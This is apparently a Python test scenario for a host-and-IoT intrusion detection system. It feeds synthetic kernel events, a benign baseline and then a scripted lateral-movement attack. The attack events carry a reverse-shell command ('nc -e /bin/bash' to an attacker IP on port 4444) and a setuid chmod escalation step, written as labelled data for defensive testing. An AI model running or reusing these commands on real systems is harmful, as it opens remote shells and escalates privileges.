"""
The end-to-end scenario: an IoT beachhead pivoting into a managed Linux host.

This is the single attack that exercises every arrow in the system-overview
diagram, in order:

  C2 scores IoT flows malicious
    -> C3 links the IoT address to a host process through a socket
    -> C3 raises a CorrelationAlert  and  E(t) back to C1
    -> C1 applies the boost; promotion requires it to cross the ROC-selected
       threshold (the current scoring-v2 demo does not claim E(t) alone does)
    -> C4 selects the minimum effective containment and applies it on both layers
    -> the lease expires and C4 rolls the containment back automatically
"""

from __future__ import annotations

import asyncio
import itertools
import random
from typing import Optional

from laax.contracts import HostEvent

# Benign process lineage seen constantly on a normal application server.
BENIGN_LINEAGE = [
    ("systemd", "nginx"), ("nginx", "nginx"), ("systemd", "postgres"),
    ("postgres", "postgres"), ("systemd", "cron"), ("cron", "logrotate"),
    ("systemd", "sshd"), ("sshd", "bash"),
]
BENIGN_EGRESS = [("nginx", 443), ("postgres", 5432), ("nginx", 80), ("cron", 123)]

IOT_ATTACKER_IP = "66.42.13.90"
HOST_IP = "10.0.0.12"


class ScriptedKernelSource:
    """
    Stands in for the BPF ring buffer.

    The real implementation replaces __anext__ with a ring-buffer poll and
    nothing else in Component 1 changes -- that separation is the point.
    """

    def __init__(self) -> None:
        self.q: asyncio.Queue = asyncio.Queue()

    async def feed(self, ev: HostEvent) -> None:
        await self.q.put(ev)

    async def close(self) -> None:
        await self.q.put(None)

    def __aiter__(self):
        return self

    async def __anext__(self) -> HostEvent:
        ev = await self.q.get()
        if ev is None:
            raise StopAsyncIteration
        return ev


async def benign_phase(src: ScriptedKernelSource, n: int = 90, seed: int = 4,
                       pace: float = 0.002) -> None:
    """Build the baseline profile. No attack data may enter this window."""
    rng = random.Random(seed)
    pids = itertools.count(1000)
    known = {"systemd": 1, "nginx": 1100, "postgres": 1200, "cron": 1300, "sshd": 1400}
    for _ in range(n):
        if rng.random() < 0.6:
            parent, child = rng.choice(BENIGN_LINEAGE)
            pid = next(pids)
            known.setdefault(child, pid)
            await src.feed(HostEvent(
                pid=pid, ppid=known.get(parent, 1), comm=child, kind="exec",
                argv=[f"/usr/sbin/{child}"], syscall="execve", source="synthetic",
                label="normal",
            ))
        else:
            comm, dport = rng.choice(BENIGN_EGRESS)
            await src.feed(HostEvent(
                pid=known.get(comm, 1100), ppid=1, comm=comm, kind="connect",
                saddr=HOST_IP, daddr=f"10.0.0.{rng.randint(20, 90)}", dport=dport,
                proto="tcp", syscall="connect", source="synthetic", label="normal",
            ))
        await asyncio.sleep(pace)


async def attack_phase(src: ScriptedKernelSource, pace: float = 0.05) -> None:
    """
    The pivot. Note what light mode does and does not see.

    The inbound accept and the shell spawn are visible in light mode as bare
    lineage and socket facts. The argv, the syscall detail and the return codes
    are only carried once the process is in deep mode. This scenario is not
    evidence that the current scoring-v2 C3 boost alone crosses that threshold.
    """
    # 1. The compromised IoT device reaches the host's exposed service.
    await src.feed(HostEvent(
        pid=1400, ppid=1, comm="sshd", kind="accept",
        saddr=IOT_ATTACKER_IP, daddr=HOST_IP, dport=22, proto="tcp",
        syscall="accept4", source="synthetic", label="lateral_movement",
    ))
    await asyncio.sleep(pace)

    # 2. A shell where a shell has never been spawned from this parent.
    await src.feed(HostEvent(
        pid=4471, ppid=1400, comm="bash", kind="exec",
        argv=["/bin/bash", "-i"], syscall="execve",
        source="synthetic", label="lateral_movement",
    ))
    await asyncio.sleep(pace)

    # 3. Discovery, then an outbound callback on an unusual port.
    for comm, argv in [("whoami", ["/usr/bin/whoami"]),
                       ("uname", ["/bin/uname", "-a"]),
                       ("nc", ["/bin/nc", "-e", "/bin/bash", IOT_ATTACKER_IP, "4444"])]:
        await src.feed(HostEvent(
            pid=next_pid(), ppid=4471, comm=comm, kind="exec",
            argv=argv, syscall="execve", source="synthetic", label="lateral_movement",
        ))
        await asyncio.sleep(pace)

    await src.feed(HostEvent(
        pid=4475, ppid=4471, comm="nc", kind="connect",
        saddr=HOST_IP, daddr=IOT_ATTACKER_IP, dport=4444, proto="tcp",
        syscall="connect", source="synthetic", label="lateral_movement",
    ))
    await asyncio.sleep(pace)

    # 4. Escalation attempt -- this is the execve C4 will deny via the LSM hook.
    await src.feed(HostEvent(
        pid=4480, ppid=4471, comm="chmod", kind="exec",
        argv=["/bin/chmod", "u+s", "/tmp/.x"], syscall="execve",
        source="synthetic", label="lateral_movement",
    ))


_pid_counter = itertools.count(4472)


def next_pid() -> int:
    return next(_pid_counter)
